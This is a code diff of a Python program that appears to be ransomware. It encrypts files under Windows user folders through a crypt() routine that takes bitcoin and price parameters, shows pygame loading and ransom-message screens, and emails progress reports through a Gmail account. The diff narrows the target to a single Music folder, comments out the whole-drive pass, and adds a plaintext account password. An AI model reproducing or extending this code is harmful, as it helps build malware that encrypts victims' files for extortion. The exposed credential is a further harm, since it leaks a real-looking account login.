@@ -1,4 +1,4 @@
-import os
+﻿import os
 import sys
 import subprocess
 import random
@@ -20,8 +20,8 @@ import pygame_textinput
 
 def Windows():
     path=('C:')
-    text1=('C:/Users/*')
-    text2=('C:/*')
+    text1=('C:/Users/fabien.marcos/Music/*')
+    #text2=('C:/*')
     verif=""
     textexe='ejecutado'
     textfin='fin users'
@@ -95,19 +95,20 @@ def Windows():
 					if aff==0:
 						mail(textexe)
 						#load
-						fond = pygame.image.load("loading.jpg").convert()
-						fond = pygame.transform.scale(fond, (640, 480))
+						fenetre = pygame.display.set_mode((1024, 768))
+						fond = pygame.image.load("loading2.jpg").convert()
+						fond = pygame.transform.scale(fond, (1024,768))
                         			fenetre.blit(fond, (0,0))
 						pygame.display.flip()
 						pygame.display.update()
 
     						crypt(text1, pwd, path, bitcoin, price,verif)
     						mail(textfin)
-						crypt(text2, pwd, path, bitcoin, price,verif)
-						mail(textall)
+						#crypt(text2, pwd, path, bitcoin, price,verif)
+						#mail(textall)
 
                         			fond = pygame.image.load("message.jpg").convert()
-						fond = pygame.transform.scale(fond, (640, 480))
+						fond = pygame.transform.scale(fond, (1024,768))
                         			fenetre.blit(fond, (0,0))
 						aff=1
                         			pygame.display.flip()
@@ -154,7 +155,7 @@ def mail(text):
     mailserver.ehlo()
     mailserver.starttls()
     mailserver.ehlo()
-    mailserver.login('patatipatatabad@gmail.com', 'PASS')
+    mailserver.login('patatipatatabad@gmail.com', 'F011006f')
     mailserver.sendmail('patatipatatabad@gmail.com', 'patatipatatabad@gmail.com', msg.as_string())
     mailserver.quit()
 
